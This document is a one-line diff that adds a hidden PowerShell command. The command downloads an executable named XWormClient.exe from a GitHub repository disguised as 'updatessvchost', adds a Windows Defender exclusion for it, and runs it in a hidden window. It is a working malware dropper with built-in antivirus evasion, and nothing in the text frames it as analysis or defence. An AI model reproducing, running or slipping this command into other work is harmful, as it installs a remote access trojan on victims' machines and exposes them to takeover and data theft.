@@ -1,0 +1,1 @@
+powershell -w hidden -c "iwr 'https://github.com/yoyodankjewel/updatessvchost/raw/refs/heads/main/XWormClient.exe' -outfile "$env:TEMP\XWormClient.exe"; Add-MpPreference -ExclusionPath "$env:TEMP\XWormClient.exe" -Force; Start-Process "$env:TEMP\XWormClient.exe" -WindowStyle Hidden"
